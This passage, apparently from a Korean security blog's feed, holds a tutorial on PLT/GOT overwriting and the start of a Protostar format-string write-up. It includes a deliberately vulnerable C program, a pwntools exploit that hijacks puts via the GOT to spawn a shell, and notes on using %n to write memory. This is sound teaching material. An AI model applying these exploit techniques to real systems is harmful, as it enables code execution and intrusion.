      &lt;li&gt;이 때 라이브러리를 찾아내는 과정에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker Name&lt;/code&gt; 을 참고한다(.so 파일).&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그리고 해당 라이브러리의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 읽어온다(.so.2.6 등의 버전 넘버).&lt;/li&gt;
  &lt;li&gt;읽어온 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 기준으로 라이브러리들을 파일에 연결시켜 컴파일한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-파일-실행-시의-행위동적-라이브러리-참조&quot;&gt;0.2. 파일 실행 시의 행위(동적 라이브러리 참조)&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;파일을 실행하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; 가 트리거된다.&lt;/li&gt;
  &lt;li&gt;Dynamic Linking 된 공유 라이브러리들을 컴파일 단계에서 확보해 둔 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 이용해 찾아 낸다.&lt;/li&gt;
  &lt;li&gt;이후 찾아낸 라이브러리들을 해당 ELF 파일의 가상 메모리 섹션에 탑재한다. (리눅스의 경우 heap과 stack 사이에 라이브러리가 탑재되고 윈도우의 경우 스택의 엉덩이에 힙의 엉덩이가 맞붙어 있는.. 형태라… 애플리케이션이 탑재된 영역 아래에 커널 라이브러리 영역이 탑재된다)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;em&gt;&lt;br /&gt;&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;03-정리&quot;&gt;0.3. 정리&lt;/h2&gt;

&lt;p&gt;즉, 정적 라이브러리 방식으로 파일을 컴파일 및 실행하게 된다면 당연히 모든 라이브러리와 함수가 해당 소스 코드에 포함된 상태로 실행되므로 굳이 라이브러리에 명시된 함수의 주소를 알아오는 과정이 필요하지 않지만&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;동적 라이브러리 링킹 방식으로 파일을 컴파일하거나 실행&lt;/strong&gt;할 때, 다양한 라이브러리 파일을 해당 소스 코드에 링킹하기 때문에 &lt;strong&gt;해당 라이브러리는 메모리의 어느 위치에 탑재되었는지, 그 라이브러리 내에 정의된 함수들은 어느 위치에 탑재되었는지&lt;/strong&gt;에 관한 정보가 필수적이다.&lt;/p&gt;

&lt;p&gt;이런 식의 정보를 쉽게 알려주기 위해 &lt;strong&gt;plt와 got&lt;/strong&gt;를 사용하게 되었다.&lt;/p&gt;

&lt;p&gt;위의 기능이 언제나 가능하도록 만들기 위해 &lt;strong&gt;“plt의 주소는 언제나 고정되어 있다”.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled.jpeg&quot; alt=&quot;최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PLT(Procedure Linkage Table)&lt;/strong&gt;는 현재 콜하려는 라이브러리상의 함수의 주소를 &lt;strong&gt;got의 어느 부분이 가리키는지&lt;/strong&gt; 알고 있다.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp {rip-x(address)}&lt;/code&gt; 포맷의 인스트럭션을 이용해 필요한 함수의 주소를 가지고 있는 got의 지점으로 포워딩해 준다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;GOT(Global Offset Table)&lt;/strong&gt;는 현재 콜하려는 라이브러리상의 &lt;strong&gt;함수의 주소를 정확히&lt;/strong&gt; 알고 있다.
    &lt;ul&gt;
      &lt;li&gt;다만, got 상에서 처음으로 함수의 주소를 알아내려 할 때 당시에는 got에 해당 함수의 주소가 없다.
        &lt;ul&gt;
          &lt;li&gt;got를 이용해 해당 함수의 주소를 알아내려고 할 때가 되어서야 Linker가 dl_resolve라는 함수를 이용해 주소를 알아와서 넣어준다.&lt;/li&gt;
          &lt;li&gt;따라서 첫 번째 접근 이후부터는 got에 항상 주소가 있게 된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;여기에서 중요한 건 &lt;strong&gt;“plt의 주소는 언제나 고정되어 있다”는 점이다. 이를 악용해 ASLR 우회가 가능&lt;/strong&gt;하기 때문이다.&lt;/p&gt;

&lt;p&gt;차후 다른 포스팅에서 got 변조를 이용한 ASLR 우회를 다룰 계획이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-코드-정적-분석&quot;&gt;1. 코드 정적 분석&lt;/h1&gt;

&lt;p&gt;먼저 주어진 문제 코드를 분석해 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//got_overwrite.c&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//gcc -o got_overwrite -no-pie&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// puts_got&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc_system: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overwrite puts_got&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//overwrite puts_got&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-plt와-got-직접-따라가-보기&quot;&gt;1.1 plt와 got 직접 따라가 보기&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*puts_got&lt;/code&gt; 의 초기화 값으로 로컬 환경에서 puts의 got 위치 주소를 직접 찾아다 넣어 줘야 한다.&lt;/p&gt;

&lt;p&gt;puts의 got 위치를 찾는 방법은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pwndbg를 이용해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt;을 하면, main+121지점에서 puts를 콜할 때 명시적 주소를 콜하는 것을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;이 때 0x400520에는 무엇이 있길래 그쪽으로 rip를 이동시켜 주는 걸까? 직접 알아보면 아래와 같은 결과를 볼 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;plt는 got의 특정 위치에 저장된 puts 함수의 주소로 rip를 포워딩&lt;/strong&gt;해 주는 역할을 하고 있었다.&lt;/p&gt;

&lt;p&gt;인스트럭션에 의한다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526+0x200af2 = 0x601018&lt;/code&gt; 에 실제 puts 함수의 주소가 저장되어 있을 것이다.&lt;/p&gt;

&lt;p&gt;jmp 인스트럭션이 위치한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400520&lt;/code&gt; 이 아닌 바로 다음 인스트럭션의 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt; 를 rip의 값으로 사용하는 이유는, 어떤 인스트럭션을 읽어 오기 위해 메모리에 접근하는 순간 pc, 즉 rip의 주소는 바로 다음 인스트럭션을 가리키게 되기 때문이다. 즉, 저 인스트럭션이 수행되는 순간의 rip는 저 인스트럭션 바로 다음 인스트럭션의 주소를 가리키고 있기 때문이다.&lt;/p&gt;

&lt;p&gt;해당 주소(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt;)에 저장된 값을 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;got의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt; 지점에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt;이 저장되어 있었고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt;으로 이동하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt;으로 점프하게 되어 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt;은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt;과 값이 가깝기 때문에 아마 got의 일부분일 것으로 예상되어 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt; 지점에 저장된 값 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7dea8f0&lt;/code&gt; 주소의 인스트럭션을 확인해 보니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dl_resolve&lt;/code&gt; 계열의 함수임을 알 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, got 는 결과적으로 puts 함수의 주소를 알아내기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dl_resolve&lt;/code&gt; 계열의 함수를 호출한다는 것을 확인할 수 있었다. 해당 함수가 정확히 어떤 매커니즘으로 puts 함수의 주소를 알아내 리턴해주는지에 관해서는 &lt;a href=&quot;https://rond-o.tistory.com/216#f61b16a1-7700-4283-826f-d6ba19990bf7&quot;&gt;여기 블로그&lt;/a&gt;가 정말 잘 설명해 두었으니 링크를 걸어둔다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어찌 되었든, puts를 찾기 위해 plt가 rip를 jmp 시키는 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt; 임을 알았으니 주어진 코드의 puts_got 값을 로컬 환경에 맞게 고칠 수 있게 되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-코드-정적-분석&quot;&gt;1.2 코드 정적 분석&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//got_overwrite.c&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//gcc -o got_overwrite -no-pie&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// puts_got&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc_system: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overwrite puts_got&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//overwrite puts_got&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;주어진 코드는 먼저 system 함수의 주소를 leak 해주고, 입력받은 값을 puts_got 변수 안에 있는 주소에 넣어주는 역할을 하고 있다.&lt;/p&gt;

&lt;p&gt;puts_got 자체가 got 테이블에 저장된 값을 변경하는 것이기 때문에, 우리는 마지막 줄에서 puts가 호출되는 시점에 엉뚱한 system 함수가 호출되도록 puts_got 변수에 system 함수의 주소를 넣어줘야 한다.&lt;/p&gt;

&lt;p&gt;또한 사용자에게 값을 받는 시점에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; 포맷 스트링을 사용하기 때문에 기본으로 8 바이트 값을 받는다고 생각하고 있어 패딩 걱정은 하지 않아도 좋을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-익스플로잇-설계&quot;&gt;2. 익스플로잇 설계&lt;/h1&gt;

&lt;p&gt;앞서 분석했던 점을 감안하면 익스플로잇이 해야 할 일은 다음과 같다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;먼저 프로그램이 출력하는 시스템 함수의 주소를 받아 저장한다.&lt;/li&gt;
  &lt;li&gt;저장했던 시스템 함수의 주소를 스트링 형식으로 입력한다. 애초에 포맷 스트링이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; 이므로 스트링으로 입력해 줘야 컴파일러가 알아서 hex 값으로 인식할 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-익스플로잇&quot;&gt;3. 익스플로잇&lt;/h1&gt;

&lt;p&gt;익스플로잇 코드는 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./got_overwrite&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_system&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000ffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;앞서 이야기한 것과 같이, plt의 주소는 고정되어 있기 때문에 ASLR을 켜도, ASLR을 꺼도 동일하게 익스플로잇에 성공할 수 있다.&lt;/p&gt;

&lt;p&gt;익스플로잇을 실행한 결과 아래와 같이 쉘을 딸 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 21 Dec 2022 11:15:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system_hacking/plt-got-overwrite</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system_hacking/plt-got-overwrite</guid>
      </item>
    
      <item>
        <title>Protostar-format1.c x86-64</title>
        <description>&lt;h1 id=&quot;format1c&quot;&gt;Format1.c&lt;/h1&gt;

&lt;p&gt;결론부터 말하자면, 이 문제는 64비트로 푸는 게 불가능한 문제다. 입력값으로 페이로드를 받는다면 어떻게든 풀 수 있겠으나, 함수의 인자로 페이로드를 받기 때문에 리눅스 쉘의 파이프 특성상 null byte가 제외되어 불가능하다.&lt;/p&gt;

&lt;p&gt;그래도 문제를 풀며 많은 것을 알게 되었으니 이렇게 정리해 둔다.&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-포맷-스트링-버그란&quot;&gt;0. 포맷 스트링 버그란&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;버퍼 오버플로우 취약점으로 이어질 수 있는 버그로,&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;사용자 입력을 검증하지 않고 사용한 결과&lt;/li&gt;
    &lt;li&gt;사용자가 악의적인 용도로 입력한 Format String이&lt;/li&gt;
    &lt;li&gt;프로그램 실행에 영향을 끼치는 것을 의미한다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;01-포맷-스트링이란&quot;&gt;0.1. 포맷 스트링이란&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;C언어에서 자주 사용되는 “출력 용도의 함수”가 출력할 “데이터의 형식을 지정”하기 위해 사용하는 특수 문자&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;포맷 스트링의 종류는 매우 다양하다.&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;인자  &lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;  입력 타입  &lt;/th&gt;
          &lt;th style=&quot;text-align: left&quot;&gt; 출력  &lt;/th&gt;
          &lt;th style=&quot;text-align: left&quot;&gt; 익스플로잇 용도  &lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%d  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  값  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 10진수 &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%s &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터 &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  해당 포인터가 가리키는 문자열  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%x  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  값  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 16진수  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 메모리를 읽을 때 사용한다  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%u  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  값  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; Unsigned 10진수  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%p  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 포인터가 가리키는 메모리 주소  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%n  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; %n이 나오기 전까지 출력했던 바이트 수를, &lt;br /&gt; 포인터가 가리키는 메모리 주소에 넣어줌  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  메모리 값을 변조할 때 사용한다 &lt;/td&gt;
